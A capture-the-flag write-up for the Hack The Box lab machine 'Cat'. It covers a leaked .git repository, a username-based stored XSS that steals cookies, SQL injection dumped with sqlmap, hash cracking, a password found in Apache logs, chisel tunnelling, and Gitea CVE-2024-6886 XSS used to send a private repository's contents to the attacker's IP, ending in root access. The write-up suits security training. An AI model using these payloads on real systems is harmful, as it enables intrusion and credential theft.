# User flag
## 1. Rustscan
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Best Cat Competition
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-git: 
|   10.129.231.253:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## 2. use git dump to recover `.git` file

```bash
┌──(.gitdumper)─(kali㉿kali)-[~/Tools/scripts/git-dumper]
└─$ python3 git_dumper.py http://cat.htb/.git ./share

Finished

┌──(.gitdumper)─(kali㉿kali)-[~/Tools/scripts/git-dumper/share]
└─$ ll
total 72
-rwxrwxr-x 1 kali kali  893 Feb 22 04:32 accept_cat.php
-rwxrwxr-x 1 kali kali 4496 Feb 22 04:32 admin.php
-rwxrwxr-x 1 kali kali  277 Feb 22 04:32 config.php
-rwxrwxr-x 1 kali kali 6676 Feb 22 04:32 contest.php
drwxrwxr-x 2 kali kali 4096 Feb 22 04:32 css
-rwxrwxr-x 1 kali kali 1136 Feb 22 04:32 delete_cat.php
drwxrwxr-x 2 kali kali 4096 Feb 22 04:32 img
drwxrwxr-x 2 kali kali 4096 Feb 22 04:32 img_winners
-rwxrwxr-x 1 kali kali 3509 Feb 22 04:32 index.php
-rwxrwxr-x 1 kali kali 5891 Feb 22 04:32 join.php
-rwxrwxr-x 1 kali kali   79 Feb 22 04:32 logout.php
-rwxrwxr-x 1 kali kali 2725 Feb 22 04:32 view_cat.php
-rwxrwxr-x 1 kali kali 1676 Feb 22 04:32 vote.php
drwxrwxr-x 2 kali kali 4096 Feb 22 04:32 winners
-rwxrwxr-x 1 kali kali 3374 Feb 22 04:32 winners.php

```

## 3. find some vuln code
```php

#=====================================================#
#       The upload part and prepare statement are     #  
#         fine but it use the username directly       #  
#=====================================================#

# ===== contest.php =====

// Check if the user is logged in
if (!isset($_SESSION['username'])) {
    header("Location: /join.php");
    exit();
}

// Function to check for forbidden content
function contains_forbidden_content($input, $pattern) {
    return preg_match($pattern, $input);
}

// Check if the form has been submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture form data
    $cat_name = $_POST['cat_name'];
    $age = $_POST['age'];
    $birthdate = $_POST['birthdate'];
    $weight = $_POST['weight'];

    $forbidden_patterns = "/[+*{}',;<>()\\[\\]\\/\\:]/";

    // Check for forbidden content
    if (contains_forbidden_content($cat_name, $forbidden_patterns) ||
        contains_forbidden_content($age, $forbidden_patterns) ||
        contains_forbidden_content($birthdate, $forbidden_patterns) ||
        contains_forbidden_content($weight, $forbidden_patterns)) {
        $error_message = "Your entry contains invalid characters.";
    } else {
        // Generate unique identifier for the image
        $imageIdentifier = uniqid() . "_";

        // Upload cat photo
        $target_dir = "uploads/";
        $target_file = $target_dir . $imageIdentifier . basename($_FILES["cat_photo"]["name"]);
        $uploadOk = 1;
        $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

        // Check if the file is an actual image or a fake file
        $check = getimagesize($_FILES["cat_photo"]["tmp_name"]);
        if($check !== false) {
            $uploadOk = 1;
        } else {
            $error_message = "Error: The file is not an image.";
            $uploadOk = 0;
        }

        // Check if the file already exists
        if (file_exists($target_file)) {
            $error_message = "Error: The file already exists.";
            $uploadOk = 0;
        }

        // Check file size
        if ($_FILES["cat_photo"]["size"] > 500000) {
            $error_message = "Error: The file is too large.";
            $uploadOk = 0;
        }

        // Allow only certain file formats
        if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
            $error_message = "Error: Only JPG, JPEG, and PNG files are allowed.";
            $uploadOk = 0;
        }

        // Check if $uploadOk is set to 0 by an error
        if ($uploadOk == 0) {
        } else {
            if (move_uploaded_file($_FILES["cat_photo"]["tmp_name"], $target_file)) {
                // Prepare SQL query to insert cat data
                $stmt = $pdo->prepare("INSERT INTO cats (cat_name, age, birthdate, weight, photo_path, owner_username) VALUES (:cat_name, :age, :birthdate, :weight, :photo_path, :owner_username)");
                // Bind parameters
                $stmt->bindParam(':cat_name', $cat_name, PDO::PARAM_STR);
                $stmt->bindParam(':age', $age, PDO::PARAM_INT);
                $stmt->bindParam(':birthdate', $birthdate, PDO::PARAM_STR);
                $stmt->bindParam(':weight', $weight, PDO::PARAM_STR);
                $stmt->bindParam(':photo_path', $target_file, PDO::PARAM_STR);
            
	            ================   here =============== 
                $stmt->bindParam(':owner_username', $_SESSION['username'], PDO::PARAM_STR);
			    ====================================
			
                // Execute query
                if ($stmt->execute()) {
                    $success_message = "Cat has been successfully sent for inspection.";
                } else {
                    $error_message = "Error: There was a problem registering the cat.";
                }
            } else {
                $error_message = "Error: There was a problem uploading the file.";
            }
        }
    }
}
?>


# the username was not sanitized when register

# ======   join.php  ===== 

// Registration process
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username'];
    $email = $_GET['email'];
    $password = md5($_GET['password']);

    $stmt_check = $pdo->prepare("SELECT * FROM users WHERE username = :username OR email = :email");
    $stmt_check->execute([':username' => $username, ':email' => $email]);
    $existing_user = $stmt_check->fetch(PDO::FETCH_ASSOC);

    if ($existing_user) {
        $error_message = "Error: Username or email already exists.";
    } else {
        $stmt_insert = $pdo->prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
        $stmt_insert->execute([':username' => $username, ':email' => $email, ':password' => $password]);

        if ($stmt_insert) {
            $success_message = "Registration successful!";
        } else {
            $error_message = "Error: Unable to register user.";
        }
    }
}

# and the cat owner is used in view_cat.php


<div class="container">
    <h1>Cat Details: <?php echo $cat['cat_name']; ?></h1>
    <img src="<?php echo $cat['photo_path']; ?>" alt="<?php echo $cat['cat_name']; ?>" class="cat-photo">
    <div class="cat-info">
        <strong>Name:</strong> <?php echo $cat['cat_name']; ?><br>
        <strong>Age:</strong> <?php echo $cat['age']; ?><br>
        <strong>Birthdate:</strong> <?php echo $cat['birthdate']; ?><br>
        <strong>Weight:</strong> <?php echo $cat['weight']; ?> kg<br>
        <strong>Owner:</strong> <?php echo $cat['username']; ?><br>
        <strong>Created At:</strong> <?php echo $cat['created_at']; ?>
    </div>
</div>

</body>
</html>


# alse there is a sql injecttion using cat name directly

<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>

```

### (1) Exploit xss and SQLi

=> https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Cross-Site-Scripting-XSS-Payloads.txt

```js
// set username to
<script>new Image().src="http://10.10.14.56:443/?c="+document.cookie;</script>
// or
<script>document.location='http://10.10.14.56:443/?c='+document.cookie;</script>


┌──(kali㉿kali)-[~]
└─$ p443
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
10.129.231.253 - - [22/Feb/2025 06:45:16] "GET /?c=PHPSESSID=543oci2oi5ljnuvahmqkgvhk1k HTTP/1.1" 200 -

//login to admin.php
// get the request
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ sqlmap -r req.txt --dbms=sqlite --level=5 --threads=10 -T users --dump

+---------+-------------------------------+----------------------------------+------------+
| user_id | email                         | password                         | username   |
+---------+-------------------------------+----------------------------------+ -----------+
| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel       |
| 5       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa       |
| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert     |
| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian     |
| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson   |
| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry      |
| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer      |
| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter      |
| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565 | angel      | 
| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad | jobert     |

// password cracked
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt --username

ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa 
```

## 4. ssh into machine and checkout apache log
```bash
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ ssh rosa@10.129.231.253

rosa@cat:/home$ ls
axel  git  jobert  rosa

# we notice this when login
url : http://cat.htb/join.php?loginUsername=user&loginPassword=password&loginForm=Login

# check out apach log
rosa@cat:/var/log/apache2$ cat access.log.1 | grep axel
127.0.0.1 - - [31/Jan/2025:11:17:37 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
```

## 5. get user.txt
```bash
rosa@cat:/var/log/apache2$ su axel
Password: 

axel@cat:~$ ls
user.txt
```


# root flag

## 1. notice this when login
```bash
You have mail.
Last login: Fri Jan 31 11:31:57 2025 from 10.10.14.69
axel@cat:~$ 

axel@cat:/var/mail$ cat axel 

From rosa@cat.htb  Sat Sep 28 04:51:50 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
        for <axel@cat.htb>; Sat, 28 Sep 2024 04:51:50 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
Date: Sat, 28 Sep 2024 04:51:49 GMT
From: rosa@cat.htb
Message-Id: <202409280451.48S4pnlT001591@cat.htb>
Subject: New cat services

Hi Axel,

We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.

Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.

From rosa@cat.htb  Sat Sep 28 05:05:28 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
        for <axel@cat.htb>; Sat, 28 Sep 2024 05:05:28 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
Date: Sat, 28 Sep 2024 05:05:28 GMT
From: rosa@cat.htb
Message-Id: <202409280505.48S55Sm0002267@cat.htb>
Subject: Employee management

We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.

=>  interesting url
http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
```
## 2. check port
```bash
axel@cat:/var/mail$ ss -ltnp
State          Recv-Q         Send-Q                   Local Address:Port                    Peer Address:Port         Process         
LISTEN         0              128                          127.0.0.1:34405                        0.0.0.0:*                            
LISTEN         0              10                           127.0.0.1:587                          0.0.0.0:*                            
LISTEN         0              37                           127.0.0.1:47403                        0.0.0.0:*                            
LISTEN         0              1                            127.0.0.1:42387                        0.0.0.0:*                            
LISTEN         0              4096                     127.0.0.53%lo:53                           0.0.0.0:*                            
LISTEN         0              128                            0.0.0.0:22                           0.0.0.0:*                            
LISTEN         0              4096                         127.0.0.1:3000                         0.0.0.0:*                            
LISTEN         0              10                           127.0.0.1:25                           0.0.0.0:* 


# port forward
┌──(kali㉿kali)-[~/Tools/scripts]
└─$ ./chisel server --reverse
2025/02/22 08:14:23 server: Reverse tunnelling enabled
2025/02/22 08:14:23 server: Listening on http://0.0.0.0:8080

axel@cat:~$ ./chisel client 10.10.14.56:8080 R:127.0.0.1:3000
2025/02/22 13:19:16 client: Connecting to ws://10.10.14.56:8080
2025/02/22 13:19:20 client: Connected (Latency 282.104213ms)
```

## 3. check port 3000
```c
# the version of gitea

Powered by Gitea
Version: 1.22.0 Page:
6ms
Template:
4ms


# Exploit Database
Gitea 1.22.0 - Stored XSS
EDB-ID:
52077
CVE:
N/A

EDB Verified:
Author:
Catalin Iovita, Alexandru Postolache
Type:
webapps

Exploit:   /  
Platform:
Multiple
Date:
2024-08-28

Vulnerable App:

# Exploit Title: Stored XSS in Gitea
# Date: 27/08/2024
# Exploit Authors: Catalin Iovita & Alexandru Postolache
# Vendor Homepage: (https://github.com/go-gitea/gitea)
# Version: 1.22.0
# Tested on: Linux 5.15.0-107, Go 1.23.0
# CVE: CVE-2024-6886

## Vulnerability Description
Gitea 1.22.0 is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability. This vulnerability allows an attacker to inject malicious scripts that get stored on the server and executed in the context of another user's session.

## Steps to Reproduce
1. Log in to the application.
2. Create a new repository or modify an existing repository by clicking the Settings button from the `$username/$repo_name/settings` endpoint.
3. In the Description field, input the following payload:

    <a href=javascript:alert()>XSS test</a>

4. Save the changes.
5. Upon clicking the repository description, the payload was successfully injected in the Description field. By clicking on the message, an alert box will appear, indicating the execution of the injected script.
```

We again find xss vuln to exploit, but the cookie used in gitea are all http only. We can't steal cookie this time, So let's try to query the interesting website found in the mail.

## 4. use gitea xss vuln to query website
```js
// try to get cookie but failed
<a href="javascript:fetch('http://10.10.14.56:443/?d='+encodeURIComponent(btoa(document.cookie)));">XSS test</a>

// send mail to jobert
axel@cat:~$ echo -e "Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/test" | sendmail jobert@cat.htb

// I think this is useful but too long
<script> fetch('http://10.10.14.56:443', { method: 'POST', body:encodeURIComponent(btoa(unescape(encodeURIComponent(data) }); </script>

// fetch secret repo
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/").then(response=>response.text()).then(data=>fetch("http://10.10.14.56:443/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>

// send mail to jobert
axel@cat:~$ echo -e "Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/test" | sendmail jobert@cat.htb

PCFET0NUWVBFIGh0bWw%2BCjxodG1sIGxhbmc9I <SNIP> dhdjhfej== HTTP/1.1
Host: 10.10.14.56:443
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://localhost:3000
Connection: keep-alive
Priority: u=4


// decode and get this
[administrator] administrator 7fa272fd5c Add README.md
	2024-09-28 04:04:08 +00:00
chart.min.js 	Upload files to "/" 	2024-09-28 01:38:13 +00:00
dashboard.php 	Upload files to "/" 	2024-09-28 01:38:13 +00:00
index.php 	Upload files to "/" 	2024-09-28 01:38:13 +00:00
logout.php 	Upload files to "/" 	2024-09-28 01:38:13 +00:00
README.md 	Add README.md 		2024-09-28 04:04:08 +00:00
style.css 	Upload files to "/" 	2024-09-28 01:38:13 +00:00

// check each of them and find this in index.php
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.14.56:443/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>

// send mail
axel@cat:~$ echo -e "Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/test" | sendmail jobert@cat.htb

// nc 
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ nc -lvnp 443                
listening on [any] 443 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.231.253] 53180
GET /?d=PD9waHAKJHZhbGlkX3VzZXJuYW1lID0gJ2FkbWluJzsKJHZhbGlkX3Bhc3N3b3JkID0gJ0lLdzc1ZVIwTVI3Q01JeGhIMCc7CgppZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8ICFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwgCiAgICAkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddICE9ICR2YWxpZF91c2VybmFtZSB8fCAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSAhPSAkdmFsaWRfcGFzc3dvcmQpIHsKICAgIAogICAgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iRW1wbG95ZWUgTWFuYWdlbWVudCInKTsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAxIFVuYXV0aG9yaXplZCcpOwogICAgZXhpdDsKfQoKaGVhZGVyKCdMb2NhdGlvbjogZGFzaGJvYXJkLnBocCcpOwpleGl0Owo%2FPgoK HTTP/1.1
Host: 10.10.14.56:443
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://localhost:3000
Connection: keep-alive
Priority: u=4

==== index.php =====
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ base64 -d <<< PD9waHAKJHZhbGlkX3VzZXJuYW1lID0gJ2FkbWluJzsKJHZhbGlkX3Bhc3N3b3JkID0gJ0lLdzc1ZVIwTVI3Q01JeGhIMCc7CgppZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8ICFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwgCiAgICAkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddICE9ICR2YWxpZF91c2VybmFtZSB8fCAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSAhPSAkdmFsaWRfcGFzc3dvcmQpIHsKICAgIAogICAgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iRW1wbG95ZWUgTWFuYWdlbWVudCInKTsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAxIFVuYXV0aG9yaXplZCcpOwogICAgZXhpdDsKfQoKaGVhZGVyKCdMb2NhdGlvbjogZGFzaGJvYXJkLnBocCcpOwpleGl0Owo/PgoK

<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
?>
```

## 5. get root flag
```c
axel@cat:~$ su root
Password: 
 
root@cat:~# ls
root.txt  scripts
```
